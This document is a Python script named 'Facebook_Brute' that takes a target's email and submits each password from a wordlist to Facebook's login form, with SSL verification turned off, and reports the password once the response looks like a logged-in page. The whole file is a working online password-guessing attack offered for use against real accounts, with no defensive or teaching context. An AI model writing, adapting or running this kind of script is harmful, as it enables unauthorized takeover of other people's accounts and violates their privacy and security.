import time
import sys
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
post_url = 'https://www.facebook.com/login.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
    import mechanize
    browser = mechanize.Browser()
    browser.addheaders = [('User-Agent', headers['User-Agent'])]
    browser.set_handle_robots(False)
except ImportError:
    print('\n\tPlease install mechanize.\n')
    sys.exit()

print('\n-----v1.1.3-----Welcome To Facebook_Brute-----Coded:Vicky-----\n')
file = open('passwords.txt', 'r')

email = input('Enter Email/Username: ').strip()

print("\nTarget Email ID:", email)
print("\nTrying Passwords from the list...")

i = 0
while True:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 6:
        continue
    print(str(i) + ": ", passw)
    response = browser.open(post_url)
    try:
        if response.code == 200:
            browser.select_form(nr=0)
            browser.form['email'] = email
            browser.form['pass'] = passw
            response = browser.submit()
            response_data = response.read()
            if b'Find Friends' in response_data or b'Two-factor authentication' in response_data or b'security code' in response_data:
                decoded_response = response_data.decode('utf-8')
                print('Your password is:', passw)
                print('Response Data:', decoded_response)
                break
    except Exception as e:
        print('Error:', e)
else:
    print('Response Data:', response_data.decode('utf-8'))